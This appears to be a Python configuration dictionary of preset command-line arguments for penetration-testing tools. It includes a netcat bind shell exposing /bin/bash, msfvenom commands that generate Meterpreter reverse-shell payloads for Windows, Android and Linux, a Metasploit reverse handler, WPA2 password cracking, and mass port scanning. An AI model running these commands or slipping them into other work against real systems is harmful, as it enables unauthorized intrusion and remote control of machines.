BUILTIN_ARGS = {
    "aircrack-ng": [
        ("-w rockyou.txt capture.cap", "Dictionary crack"),
        ("-b 00:11:22:33:44:55 capture.cap", "Target specific BSSID"),
        ("-a 2 -w rockyou.txt capture.cap", "WPA2 crack"),
    ],
    "tcpdump": [
        ("-i any port 80", "HTTP traffic"),
        ("-i any host 192.168.1.1", "Specific host"),
        ("-i wlan0 -w capture.pcap", "Save to file"),
        ("-i any -n port not 22", "All except SSH"),
    ],
    "netcat": [
        ("-lvp 4444", "Listen on port 4444"),
        ("-e /bin/bash -lvp 4444", "Bind shell"),
        ("target.com 80", "Connect to port 80"),
        ("-zv target.com 1-1000", "Port scan"),
    ],
    "masscan": [
        ("-p80,443 192.168.1.0/24 --rate=1000", "Web ports fast"),
        ("-p1-65535 target.com --rate=5000", "All ports fast"),
        ("-p22,80,443,8080 target.com", "Common ports"),
    ],
    "bettercap": [
        ("-iface wlan0", "Start on WiFi"),
        ("-eval net.probe on", "Network probe"),
        ("-eval wifi.recon on", "WiFi recon"),
        ("-eval net.sniff on", "Packet sniffing"),
    ],
    "msfconsole": [
        ("-q", "Quiet start"),
        ("-x use exploit/multi/handler; set PAYLOAD; set LHOST; set LPORT; run", "Reverse handler"),
    ],
    "msfvenom": [
        ("-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe", "Windows reverse"),
        ("-p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk", "Android payload"),
        ("-p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf", "Linux reverse"),
        ("-l payloads", "List all payloads"),
    ],
}
